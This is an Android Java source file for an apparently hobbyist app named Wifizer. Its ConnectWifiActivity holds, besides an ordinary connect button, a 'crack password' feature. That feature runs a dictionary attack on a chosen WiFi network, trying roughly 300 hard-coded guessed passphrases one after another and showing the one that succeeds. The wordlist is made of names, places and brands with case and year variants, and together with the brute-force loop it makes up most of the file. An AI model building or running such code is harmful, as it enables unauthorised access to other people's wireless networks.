package net.wifizer;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

public class ConnectWifiActivity extends AppCompatActivity implements onDialogCancelListener {
	public String[] passes = {
		"12345678", "123456789", "1234567890", "admin12345", "password", "Password", "PASSWORD",
		"asdfghjkl", "0000000000", "1111111111", "2222222222", "3333333333", "4444444444", "5555555555",
		"6666666666", "7777777777", "8888888888", "9999999999", "kapilvastu", "Kapilvastu",
		"KAPILVASTU", "kapilvastu123", "Kapilvastu123", "KAPILVASTU123", "kapilvastu12345", "Kapilvastu12345",
		"KAPILVASTU12345", "asianpaint", "asianpaints", "Asianpaint", "Asianpaints", "ASIANPAINT", "ASIANPAINTS",
		"barawa123", "Barawa123", "BARAWA123", "nepal123", "nepal12345", "Nepal123", "Nepal12345", "NEPAL123",
		"NEPAL12345", "binod", "BINOD", "Binod", "bInOd", "BINod", "bINod", "binod123", "BINOD123", "Binod123",
		"bInOd123", "BINod123", "bINod123", "binod@2024", "BINOD@2024", "Binod@2024", "bInOd@2024", "BINod@2024",
		"bINod@2024", "binod2024", "BINOD2024", "Binod2024", "bInOd2024", "BINod2024", "bINod2024", "bhattarai",
		"BHATTAiRAI", "Bhattarai", "bHattARai", "BHTTaRAI", "bHATTarai", "bhattarai123", "BHATTAiRAI123",
		"Bhattarai123", "bHattARai123", "BHTTaRAI123", "bHATTarai123", "bhattarai@2024", "BHATTAiRAI@2024",
		"Bhattarai@2024", "bHattARai@2024", "BHTTaRAI@2024", "bHATTarai@2024", "bhattarai2024", "BHATTAiRAI2024",
		"Bhattarai2024", "bHattARai2024", "BHTTaRAI2024", "bHATTarai2024", "lumbini", "LUMBINI", "Lumbini",
		"lUMbINi", "LUMbINI", "lumBINI", "lumbini123", "LUMBINI123", "Lumbini123", "lUMbINi123", "LUMbINI123",
		"lumBINI123", "lumbini@2024", "LUMBINI@2024", "Lumbini@2024", "lUMbINi@2024", "LUMbINI@2024",
		"lumBINI@2024", "lumbini2024", "LUMBINI2024", "Lumbini2024", "lUMbINi2024", "LUMbINI2024", "lumBINI2024",
		"maya", "MAYA", "Maya", "mAYa", "MAYa", "mAYA", "maya123", "MAYA123", "Maya123", "mAYa123", "MAYa123",
		"mAYA123", "maya@2024", "MAYA@2024", "Maya@2024", "mAYa@2024", "MAYa@2024", "mAYA@2024", "maya2024",
		"MAYA2024", "Maya2024", "mAYa2024", "MAYa2024", "mAYA2024", "yagya", "YAGYA", "Yagya", "yAGYA", "YAGya",
		"yaGYA", "yagya123", "YAGYA123", "Yagya123", "yAGYA123", "YAGya123", "yaGYA123", "yagya@2024",
		"YAGYA@2024", "Yagya@2024", "yAGYA@2024", "YAGya@2024", "yaGYA@2024", "yagya2024", "YAGYA2024",
		"Yagya2024", "yAGYA2024", "YAGya2024", "yaGYA2024", "radha", "RADHA", "Radha", "rADHA", "RAdHa", "raDHA",
		"radha123", "RADHA123", "Radha123", "rADHA123", "RAdHa123", "raDHA123", "radha@2024", "RADHA@2024",
		"Radha@2024", "rADHA@2024", "RAdHa@2024", "raDHA@2024", "radha2024", "RADHA2024", "Radha2024",
		"rADHA2024", "RAdHa2024", "raDHA2024", "sarika", "SARIKA", "Sarika", "sARiKA", "SARika", "saRIKA",
		"sarika123", "SARIKA123", "Sarika123", "sARiKA123", "SARika123", "saRIKA123", "sarika@2024", "SARIKA@2024",
		"Sarika@2024", "sARiKA@2024", "SARika@2024", "saRIKA@2024", "sarika2024", "SARIKA2024", "Sarika2024",
		"sARiKA2024", "SARika2024", "saRIKA2024", "sarthak", "SARTHAK", "Sarthak", "sARTHaK", "SArTHak", "sArTHAk",
		"sarthak123", "SARTHAK123", "Sarthak123", "sARTHaK123", "SArTHak123", "sArTHAk123", "sarthak@2024",
		"SARTHAK@2024", "Sarthak@2024", "sARTHaK@2024", "SArTHak@2024", "sArTHAk@2024", "sarthak2024",
		"SARTHAK2024", "Sarthak2024", "sARTHaK2024", "SArTHak2024", "sArTHAk2024", "Volkswagen", "VOLKSWAGEN",
		"vOLKSWAGen", "VOLKsWAGEn", "vOLKSwAGEn", "Volkswagen123", "VOLKSWAGEN123", "vOLKSWAGen123",
		"VOLKsWAGEn123", "vOLKSwAGEn123", "Volkswagen@2024", "VOLKSWAGEN@2024", "vOLKSWAGen@2024",
		"VOLKsWAGEn@2024", "vOLKSwAGEn@2024", "Volkswagen2024", "VOLKSWAGEN2024", "vOLKSWAGen2024",
		"VOLKsWAGEn2024", "vOLKSwAGEn2024", "iPhone", "IPHONE", "iPHoNE", "IPHonE", "ipHONE", "iPhone123",
		"IPHONE123", "iPHoNE123", "IPHonE123", "ipHONE123", "iPhone@2024", "IPHONE@2024", "iPHoNE@2024",
		"IPHonE@2024", "ipHONE@2024", "iPhone2024", "IPHONE2024", "iPHoNE2024", "IPHonE2024", "ipHONE2024",
		"AsianPains", "ASIANPAINS", "aSiaNPains", "ASiaNpAINS", "asIAnPains", "AsianPains123", "ASIANPAINS123",
		"aSiaNPains123", "ASiaNpAINS123", "asIAnPains123", "AsianPains@2024", "ASIANPAINS@2024", "aSiaNPains@2024",
		"ASiaNpAINS@2024", "asIAnPains@2024", "AsianPains2024", "ASIANPAINS2024", "aSiaNPains2024",
		"ASiaNpAINS2024", "asIAnPains2024"
	};
	private EditText networkNameEditText;
	private EditText passwordEditText;
	private Button connectButton;
	private Button crackPasswordButton;
	private ImageButton backArrow;
	private TextView networkTypeTextView;
	private TextView hiddenStatusTextView;
	private ConnectivityManager.NetworkCallback networkCallback;
	private ProgressDialog dialog;
	private boolean isCancelled = false;
	private SharedPreferences sharedPreferences;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_connectwifi); // Ensure this matches your actual layout file

		dialog = new ProgressDialog(this, this);
		dialog.setOnDialogCancelListener(this);

		if (getSharedPreferences("WifizerPrefs", MODE_PRIVATE).getBoolean("useOwnPasses", false)) {

		}
		// Initialize views
		backArrow = findViewById(R.id.back_arrow);
		networkNameEditText = findViewById(R.id.network_name);
		passwordEditText = findViewById(R.id.password);
		connectButton = findViewById(R.id.connect_button);
		crackPasswordButton = findViewById(R.id.crack_password_button);

		// Get data from the intent
		Intent intent = getIntent();
		String ssid = intent.getStringExtra("SSID");
		boolean hidden = intent.getBooleanExtra("HIDDEN", false);

		// Set the network name and other data
		networkNameEditText.setText(ssid);

		networkNameEditText.setEnabled(hidden);

		// Set up button listeners
		backArrow.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				finish();
			}
		});

		connectButton.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				handleConnect();
			}
		});

		crackPasswordButton.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				isCancelled = false; // Reset cancellation flag
				dialog.show();
				handleCrackPassword();

			}
		});
	}

	private void handleConnect() {
		String ssid = networkNameEditText.getText().toString();
		String password = passwordEditText.getText().toString();

		WifiNetworkSpecifier specifier = new WifiNetworkSpecifier.Builder().setSsid(ssid).setWpa2Passphrase(password)
				.build();
		// Create a NetworkRequest using the specifier
		NetworkRequest networkRequest = new NetworkRequest.Builder()
				.addTransportType(NetworkCapabilities.TRANSPORT_WIFI).setNetworkSpecifier(specifier).build();

		// Connect to the WiFi network
		ConnectivityManager connectivityManager = getSystemService(ConnectivityManager.class);
		if (connectivityManager != null) {
			networkCallback = new ConnectivityManager.NetworkCallback() {
				@Override
				public void onAvailable(android.net.Network network) {
					super.onAvailable(network);
					// The device is connected to the WiFi network
					notification("Connected", "Successfully connected to :- ", ssid);

				}

				@Override
				public void onUnavailable() {
					super.onUnavailable();
					// Failed to connect to the WiFi network

				}
			};

			connectivityManager.requestNetwork(networkRequest, networkCallback);

		}
	}

	private void handleCrackPassword() {
		String networkName = networkNameEditText.getText().toString();
		Toast.makeText(this, "Cracking password...", Toast.LENGTH_SHORT).show();
		connect(networkName, 0);
	}

	private void connect(final String ssid, int passwordIndex) {
		if (isCancelled) {
			dialog.setDataFieldText("Cancelled");
			return; // Exit if process is cancelled
		}
		if (passwordIndex < passes.length) {
			WifiNetworkSpecifier specifier = new WifiNetworkSpecifier.Builder().setSsid(ssid)
					.setWpa2Passphrase(passes[passwordIndex]).build();
			dialog.updateProgress(passwordIndex + 1, passes.length);
			dialog.setDataFieldText(passes[passwordIndex]);

			NetworkRequest networkRequest = new NetworkRequest.Builder()
					.addTransportType(NetworkCapabilities.TRANSPORT_WIFI).setNetworkSpecifier(specifier).build();

			ConnectivityManager connectivityManager = getSystemService(ConnectivityManager.class);
			if (connectivityManager != null) {
				networkCallback = new ConnectivityManager.NetworkCallback() {
					@Override
					public void onAvailable(Network network) {
						super.onAvailable(network);
						if (isCancelled) {
							dialog.setDataFieldText("Cancelled");
							return;
						}
						// Password is correct, show notification

						notification("Pass Confirmed", "connection success", passes[passwordIndex]);
						dialog.setDataFieldText("Success...");
						// Release the network request
						connectivityManager.unregisterNetworkCallback(networkCallback);
					}

					@Override
					public void onUnavailable() {
						super.onUnavailable();
						if (isCancelled) {
							dialog.setDataFieldText("Cancelled");
							return;
						}

						notification("Pass Failed  :- ",
								Integer.toString(passwordIndex) + "/" + Integer.toString(passes.length),
								passes[passwordIndex]);
						try {
							// Pause for 2 seconds (2000 milliseconds)
							Thread.sleep(2000);
						} catch (InterruptedException e) {

						}
						connect(ssid, passwordIndex + 1);
					}
				};

				// Request network
				connectivityManager.requestNetwork(networkRequest, networkCallback);
			}
		} else {
			dialog.setDataFieldText("No password Match");
		}
	}

	private void notification(String title, String content, String pass) {
		Notifier notify = new Notifier(this);
		notify.showNotification(title, content, pass);
	}

	@Override
	public void onDialogCancel() {
		isCancelled = true; // Set the cancellation flag
		// Optionally perform additional cleanup if necessary
	}
}